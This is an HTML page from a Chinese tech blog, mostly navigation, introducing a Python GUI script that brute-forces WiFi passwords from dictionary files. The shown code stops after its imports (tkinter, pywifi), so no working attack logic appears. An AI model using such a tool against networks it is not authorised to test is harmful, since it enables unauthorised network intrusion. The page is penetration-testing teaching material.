@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <title>Python爆破Wifi密码 | 冰河技术</title>
+    <meta name="generator" content="VuePress 1.9.7">
+    <link rel="icon" href="/favicon.ico">
+    <script charset="utf-8" async="async" src="/js/jquery.min.js"></script>
+    <script charset="utf-8" async="async" src="/js/global.js"></script>
+    <script charset="utf-8" async="async" src="/js/fingerprint2.min.js"></script>
+    <script charset="utf-8" async="async" src="https://v1.cnzz.com/z_stat.php?id=1281063564&amp;web_id=1281063564"></script>
+    <script charset="utf-8" async="async" src="https://s9.cnzz.com/z_stat.php?id=1281064551&amp;web_id=1281064551"></script>
+    <script>
+            var _hmt = _hmt || [];
+            (function() {
+              var hm = document.createElement("script");
+              hm.src = "https://hm.baidu.com/hm.js?d091d2fd0231588b1d0f9231e24e3f5e";
+              var s = document.getElementsByTagName("script")[0];
+              s.parentNode.insertBefore(hm, s);
+            })();
+            </script>
+    <meta name="description" content="包含：编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧...">
+    <meta property="article:modified_time" content="2022-05-02T13:58:12.000Z">
+    <meta property="og:title" content="Python爆破Wifi密码">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="/md/hack/crack/2022-05-02-003-Python%E7%88%86%E7%A0%B4Wifi%E5%AF%86%E7%A0%81.html">
+    <meta name="twitter:title" content="Python爆破Wifi密码">
+    <meta name="twitter:url" content="/md/hack/crack/2022-05-02-003-Python%E7%88%86%E7%A0%B4Wifi%E5%AF%86%E7%A0%81.html">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="robots" content="all">
+    <meta name="author" content="冰河">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta name="keywords" content="冰河，冰河技术, 编程语言，开发技术，分布式，微服务，高并发，高可用，高可扩展，高可维护，JVM技术，MySQL，分布式数据库，分布式事务，云原生，大数据，云计算，渗透技术，各种面试题，面试技巧">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    
+    <link rel="preload" href="/assets/css/0.styles.ab888ebb.css" as="style"><link rel="preload" href="/assets/css/styles.css?v=1651499968859" as="style"><link rel="preload" href="/assets/js/cg-styles.js?v=1651499968859" as="script"><link rel="preload" href="/assets/js/cg-app.js?v=1651499968859" as="script"><link rel="preload" href="/assets/js/cg-4.js?v=1651499968859" as="script"><link rel="preload" href="/assets/js/cg-3.js?v=1651499968859" as="script"><link rel="preload" href="/assets/js/cg-137.js?v=1651499968859" as="script"><link rel="preload" href="/assets/js/cg-5.js?v=1651499968859" as="script"><link rel="preload" href="/assets/js/cg-6.js?v=1651499968859" as="script">
+    <link rel="stylesheet" href="/assets/css/0.styles.ab888ebb.css"><link rel="stylesheet" href="/assets/css/styles.css?v=1651499968859">
+  </head>
+  <body>
+    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><!----> <span class="site-name">冰河技术</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/2022-05-02-001-各种解析漏洞拿shell.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/2022-05-02-001-使用rarcrack暴力破解RAR-ZIP-7Z压缩包.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/default.html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/default.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/md/other/guide-to-reading.html" class="nav-link">
+  导读
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="核心技术" class="dropdown-title"><span class="title">核心技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          Java核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/java/basics/2022-04-28-全网最全正则表达式总结.html" class="nav-link">
+  Java基础
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/advanced/default.html" class="nav-link">
+  Java进阶
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/senior/default.html" class="nav-link">
+  Java高级
+</a></li><li class="dropdown-subitem"><a href="/md/core/java/java8/2022-03-31-001-Java8有哪些新特性呢？.html" class="nav-link">
+  Java8新特性
+</a></li></ul></li><li class="dropdown-item"><h4>
+          Spring核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/spring/ioc/2022-04-04-001-聊聊Spring注解驱动开发那些事儿.html" class="nav-link">
+  IOC核心技术
+</a></li><li class="dropdown-subitem"><a href="/md/core/spring/aop/default.html" class="nav-link">
+  AOP核心技术
+</a></li></ul></li><li class="dropdown-item"><h4>
+          JVM核心技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/core/jvm/2022-04-18-001-JVM调优的几种场景.html" class="nav-link">
+  JVM调优技术
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="性能调优" class="dropdown-title"><span class="title">性能调优</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/performance/jvm/default.html" class="nav-link">
+  JVM性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/tomcat/default.html" class="nav-link">
+  Tomcat性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/mysql/default.html" class="nav-link">
+  MySQL性能调优
+</a></li><li class="dropdown-item"><!----> <a href="/md/performance/system/default.html" class="nav-link">
+  操作系统性能调优
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="并发编程" class="dropdown-title"><span class="title">并发编程</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/concurrent/bottom/default.html" class="nav-link">
+  底层技术
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/source/2020-03-30-001-一文搞懂线程与多线程.html" class="nav-link">
+  源码分析
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/basics/2020-03-30-001-明明中断了线程，却为何不起作用呢？.html" class="nav-link">
+  基础案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/ActualCombat/default.html" class="nav-link">
+  实战案例
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/interview/default.html" class="nav-link">
+  面试
+</a></li><li class="dropdown-item"><!----> <a href="/md/concurrent/framework/default.html" class="nav-link">
+  系统架构
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="框架源码" class="dropdown-title"><span class="title">框架源码</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/frame/spring/default.html" class="nav-link">
+  Spring源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/springmvc/default.html" class="nav-link">
+  SpringMVC源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/mybatis/default.html" class="nav-link">
+  MyBatis源码
+</a></li><li class="dropdown-item"><!----> <a href="/md/frame/dubbo/default.html" class="nav-link">
+  Dubbo源码
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="分布式" class="dropdown-title"><span class="title">分布式</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          缓存技术
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/cache/default.html" class="nav-link">
+  Redis
+</a></li></ul></li><li class="dropdown-item"><h4>
+          服务注册发现
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/zookeeper/default.html" class="nav-link">
+  Zookeeper
+</a></li></ul></li><li class="dropdown-item"><h4>
+          消息中间件
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mq/rabbitmq/default.html" class="nav-link">
+  RabbitMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/rocketmq/default.html" class="nav-link">
+  RocketMQ
+</a></li><li class="dropdown-subitem"><a href="/md/distributed/mq/kafka/default.html" class="nav-link">
+  Kafka
+</a></li></ul></li><li class="dropdown-item"><h4>
+          网络通信
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/netty/default.html" class="nav-link">
+  Netty
+</a></li></ul></li><li class="dropdown-item"><h4>
+          远程调用
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/dubbo/default.html" class="nav-link">
+  Dubbo
+</a></li></ul></li><li class="dropdown-item"><h4>
+          数据库
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/mongodb/default.html" class="nav-link">
+  MongoDB
+</a></li></ul></li><li class="dropdown-item"><h4>
+          搜索引擎
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/distributed/es/default.html" class="nav-link">
+  ElasticSearch
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="微服务" class="dropdown-title"><span class="title">微服务</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/microservices/springboot/default.html" class="nav-link">
+  SpringBoot
+</a></li><li class="dropdown-item"><!----> <a href="/md/microservices/springcloudalibaba/2022-04-02-SpringCloudAlibaba专栏开篇.html" class="nav-link">
+  SpringCloudAlibaba
+</a></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="中间件" class="dropdown-title"><span class="title">中间件</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/middleware/bytecode/2022-04-11-001-工作多年的你依然重复做着CRUD-是否接触过这种技术.html" class="nav-link">
+  字节码编程
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/threadpool/default.html" class="nav-link">
+  手写线程池
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/limiter/default.html" class="nav-link">
+  分布式限流
+</a></li><li class="dropdown-item"><!----> <a href="/md/middleware/independent/default.html" class="nav-link">
+  开源项目
+</a></li></ul></div></div><div class="nav-item"><a href="/md/project/default.html" class="nav-link">
+  项目实战
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="渗透技术" class="dropdown-title"><span class="title">渗透技术</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/hack/environment/2022-04-17-001-安装Kali系统.html" class="nav-link">
+  基础环境篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/tools/2022-04-17-001-使用Easy-Creds工具攻击无线网络.html" class="nav-link">
+  渗透工具篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/horse/2022-05-02-001-各种一句话木马大全.html" class="nav-link">
+  木马篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sql/2022-05-02-001-sqli-labs-master下载与安装.html" class="nav-link">
+  SQL注入篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/shell/2022-05-02-001-各种解析漏洞拿shell.html" class="nav-link">
+  漏洞拿Shell篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/crack/2022-05-02-001-使用rarcrack暴力破解RAR-ZIP-7Z压缩包.html" class="nav-link">
+  暴力破解篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/bash/default.html" class="nav-link">
+  渗透脚本篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/raising/default.html" class="nav-link">
+  数据与系统提权篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/client/default.html" class="nav-link">
+  客户端渗透篇
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/sociology/default.html" class="nav-link">
+  社会工程学
+</a></li><li class="dropdown-item"><!----> <a href="/md/hack/question/default.html" class="nav-link">
+  问题记录篇
+</a></li></ul></div></div><div class="nav-item"><a href="/md/interview/2022-04-18-001-面试必问-聊聊JVM性能调优.html" class="nav-link">
+  面试必问系列
+</a></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="📚PDF" class="dropdown-title"><span class="title">📚PDF</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><h4>
+          出版图书
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-深入理解分布式事务.html" class="nav-link">
+  《深入理解分布式事务：原理与实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-MySQL技术大全.html" class="nav-link">
+  《MySQL技术大全：开发、优化与运维实战》
+</a></li><li class="dropdown-subitem"><a href="/md/knowledge/book/2022-03-29-海量数据处理与大数据技术实战.html" class="nav-link">
+  《海量数据处理与大数据技术实战》
+</a></li></ul></li><li class="dropdown-item"><h4>
+          电子书籍
+        </h4> <ul class="dropdown-subitem-wrapper"><li class="dropdown-subitem"><a href="/md/knowledge/pdf/2022-03-30-《冰河的渗透实战笔记》电子书，442页，37万字，正式发布.html" class="nav-link">
+  冰河的渗透实战笔记
+</a></li></ul></li></ul></div></div><div class="nav-item"><div class="dropdown-wrapper"><button type="button" aria-label="关于" class="dropdown-title"><span class="title">关于</span> <span class="arrow right"></span></button> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/md/about/me/about-me.html" class="nav-link">
+  关于自己
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/study/default.html" class="nav-link">
+  关于学习
+</a></li><li class="dropdown-item"><!----> <a href="/md/about/job/default.html" class="nav-link">
+  关于职场
+</a></li></ul></div></div><div class="nav-item"><a href="https://space.bilibili.com/517638832" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  B站
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div><div class="nav-item"><a href="https://github.com/binghe001/BingheGuide" target="_blank" rel="noopener noreferrer" class="nav-link external">
+  Github
+  <span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>暴力破解篇</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/md/hack/crack/2022-05-02-001-使用rarcrack暴力破解RAR-ZIP-7Z压缩包.html" class="sidebar-link">使用rarcrack暴力破解RAR，ZIP，7Z压缩包</a></li><li><a href="/md/hack/crack/2022-05-02-002-使用reaver傻瓜式破解wifi之利用路由器WPS漏洞.html" class="sidebar-link">使用reaver傻瓜式破解wifi之利用路由器WPS漏洞</a></li><li><a href="/md/hack/crack/2022-05-02-003-Python爆破Wifi密码.html" class="active sidebar-link">Python爆破Wifi密码</a></li><li><a href="/md/hack/crack/2022-05-02-004-MySQL暴力破解工具多线程版.html" class="sidebar-link">MySQL暴力破解工具多线程版</a></li></ul></section></li></ul> </aside> <div><main class="page"> <div class="theme-default-content content__default"><h1 id="python爆破wifi密码"><a href="#python爆破wifi密码" class="header-anchor">#</a> Python爆破Wifi密码</h1> <p>脚本以图形界面的形式，选择爆破的用户名字典文件和密码字典文件进行Wifi爆破。</p> <div class="language-python line-numbers-mode"><pre class="language-python"><code><span class="token comment">#!/usr/bin/env python</span>
+<span class="token comment"># -*- coding: gbk -*-</span>
+<span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token comment"># Date: 2019/01/10</span>
+<span class="token comment"># Created by 冰河</span>
+<span class="token comment"># Description Wifi爆破工具(图形界面版)</span>
+<span class="token comment"># 博客 https://blog.csdn.net/l1028386804</span>
+<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> tkinter <span class="token keyword">import</span> ttk  
+<span class="token keyword">import</span> pywifi
+<span class="token keyword">from</span> pywifi <span class="token keyword">import</span> const
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>filedialog
